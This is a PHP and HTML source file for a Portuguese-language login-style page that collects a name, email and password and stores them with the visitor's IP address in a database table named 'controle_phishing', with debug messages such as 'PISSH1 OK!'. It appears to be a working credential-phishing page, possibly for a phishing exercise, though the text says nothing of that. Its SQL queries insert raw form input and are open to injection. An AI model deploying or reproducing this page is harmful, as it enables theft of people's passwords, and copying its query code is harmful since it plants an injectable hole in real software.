
<!DOCTYPE html>
<html>

 <?php

include "sql.php";
       
     $ip_criacao = $_SERVER['REMOTE_ADDR'];
     
	   

 

       $sql = mysql_query("INSERT INTO `controle_phishing`(`nome`, `email`, `senha`, `ip_criacao`,`data_criacao`,`stage1`) VALUES ('$nome', '$email', '$senha','$ip_criacao',now(),'1')") or die(mysql_error());

            if($sql){

                $erro2 = "PISSH1 OK!";

              } else{

                  $erro = "PISHI1 FAIL";

              }

 



?>    




 <?php

include "sql.php";
       
if(isset($_POST['done'])){   

    $nome = $_POST['nome'];
    $senha = $_POST['senha'];
    $email = $_POST['email'];		

    // AUDITORIA 
    $ip_criacao = $_SERVER['REMOTE_ADDR'];
     
	   

    if(empty($nome) || empty($email) || empty($senha)){

        $erro = "Atenção, você deve preencher todos os campos";

    }else{        

       $sql = mysql_query("INSERT INTO `controle_phishing`(`nome`, `email`, `senha`, `ip_criacao`,`data_criacao`,`stage2`) VALUES ('$nome', '$email', '$senha','$ip_criacao',now(),'1')") or die(mysql_error());

            if($sql){

                $erro2 = "Dados cadastrados com sucesso!";

              } else{

                  $erro = "Não foi possivel cadastrar os dados";

              }

    }

}

?>    
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,700" rel="stylesheet">
    <link rel="stylesheet" href="css/bulma.min.css" />
    <link rel="stylesheet" type="text/css" href="css/login.css">
</head>

<body>

    <section class="hero is-success is-fullheight">
	
        
            <div class="container has-text-centered">			
                <div class="column is-4 is-offset-4">
                    <h1 class="title has-text-grey"></h1>
					<h2 class="title has-text-grey"><font size=4></font></h2>                   
<img src=logo.png>
                    <div class="box">
                        <form name="form1" action="init.php" method="POST">
						<?php
if(isset($erro)){
    print '<div style="width:80%; background:red; color:Black; padding: 5px 0px 5px 0px; text-align:center; margin: 0 auto;">'.$erro.'</div>';
}
if(isset($erro2)){
    print '<div style="width:80%; background:green; color:Black; padding: 5px 0px 5px 0px; text-align:center; margin: 0 auto;">'.$erro2.'</div>';
}
?>	
                            <div class="field">
                                <div class="control">
                                   				        <input name="nome" class="input is-large" placeholder="nome" autofocus="" >
									<input name="email"  class="input is-large" placeholder="email" autofocus="">
									<input name="senha" type="password"  class="input is-large" placeholder="senha" autofocus="">

                                </div>
                            </div>
                            
                            <button type="submit"  class="button is-block is-link is-large is-fullwidth">Alterar</button><input type="hidden" name="done"  value="" />
                        </form>
						
                    </div>
                </div>
            </div>
        </div>
    </section>
	
	

<br>

</body>

</html>